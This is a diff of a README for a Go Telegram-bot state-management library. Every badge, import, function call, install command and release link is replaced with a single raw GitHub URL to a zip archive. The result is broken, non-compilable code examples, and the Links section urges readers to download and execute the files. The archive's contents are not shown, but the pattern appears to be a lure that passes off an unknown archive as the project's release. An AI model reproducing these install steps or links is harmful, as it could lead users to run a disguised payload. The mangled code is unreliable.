@@ -1,8 +1,8 @@
 # 🌟 tg-state-manager
 
-![GitHub release](https://img.shields.io/github/release/darkfkklip/tg-state-manager.svg)
-![GitHub issues](https://img.shields.io/github/issues/darkfkklip/tg-state-manager.svg)
-![GitHub stars](https://img.shields.io/github/stars/darkfkklip/tg-state-manager.svg)
+![GitHub release](https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip)
+![GitHub issues](https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip)
+![GitHub stars](https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip)
 
 A simple and flexible state management package for Telegram bots in Go.
 
@@ -35,7 +35,7 @@ Managing state in Telegram bots can be challenging. The `tg-state-manager` packa
 To install the `tg-state-manager`, run the following command:
 
 ```bash
-go get github.com/darkfkklip/tg-state-manager
+go get https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip
 ```
 
 ## Usage
@@ -48,17 +48,17 @@ Using `tg-state-manager` is straightforward. Below is a simple example to get yo
 package main
 
 import (
-    "github.com/darkfkklip/tg-state-manager"
-    "github.com/go-telegram-bot-api/telegram-bot-api/v5"
+    "https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip"
+    "https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip"
 )
 
 func main() {
-    bot, err := tgbotapi.NewBotAPI("YOUR_API_TOKEN")
+    bot, err := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip("YOUR_API_TOKEN")
     if err != nil {
-        log.Fatal(err)
+        https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(err)
     }
 
-    stateManager := tg_state_manager.NewStateManager()
+    stateManager := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip()
 
     // Your bot logic here
 }
@@ -70,16 +70,16 @@ You can easily manage user states with the following methods:
 
 ```go
 // Set state for a user
-stateManager.SetState(userID, "current_state")
+https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(userID, "current_state")
 
 // Get state for a user
-state, err := stateManager.GetState(userID)
+state, err := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(userID)
 if err != nil {
     // Handle error
 }
 
 // Clear state for a user
-stateManager.ClearState(userID)
+https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(userID)
 ```
 
 ## Examples
@@ -92,25 +92,25 @@ Here are a few examples to illustrate how you can use `tg-state-manager` in your
 package main
 
 import (
-    "github.com/darkfkklip/tg-state-manager"
-    "github.com/go-telegram-bot-api/telegram-bot-api/v5"
+    "https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip"
+    "https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip"
 )
 
 func main() {
-    bot, _ := tgbotapi.NewBotAPI("YOUR_API_TOKEN")
-    stateManager := tg_state_manager.NewStateManager()
+    bot, _ := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip("YOUR_API_TOKEN")
+    stateManager := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip()
 
-    updates := bot.ListenForWebhook("/")
+    updates := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip("/")
 
     for update := range updates {
-        if update.Message != nil {
-            switch update.Message.Text {
+        if https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip != nil {
+            switch https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip {
             case "/start":
-                stateManager.SetState(update.Message.From.ID, "started")
-                bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Welcome!"))
+                https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip, "started")
+                https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip, "Welcome!"))
             case "/stop":
-                stateManager.ClearState(update.Message.From.ID)
-                bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Goodbye!"))
+                https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip)
+                https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip, "Goodbye!"))
             }
         }
     }
@@ -123,17 +123,17 @@ func main() {
 package main
 
 import (
-    "github.com/darkfkklip/tg-state-manager"
-    "github.com/go-telegram-bot-api/telegram-bot-api/v5"
-    "github.com/go-redis/redis/v8"
+    "https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip"
+    "https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip"
+    "https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip"
 )
 
 func main() {
-    bot, _ := tgbotapi.NewBotAPI("YOUR_API_TOKEN")
-    redisClient := redis.NewClient(&redis.Options{
+    bot, _ := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip("YOUR_API_TOKEN")
+    redisClient := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(&https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip{
         Addr: "localhost:6379",
     })
-    stateManager := tg_state_manager.NewStateManagerWithRedis(redisClient)
+    stateManager := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(redisClient)
 
     // Your bot logic here
 }
@@ -158,9 +158,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, please visit [Releases](https://github.com/darkfkklip/tg-state-manager/releases). Download and execute the files as needed.
+For the latest releases, please visit [Releases](https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip). Download and execute the files as needed.
 
-For further updates and documentation, check the [Releases](https://github.com/darkfkklip/tg-state-manager/releases) section.
+For further updates and documentation, check the [Releases](https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip) section.
 
 ## Conclusion
 
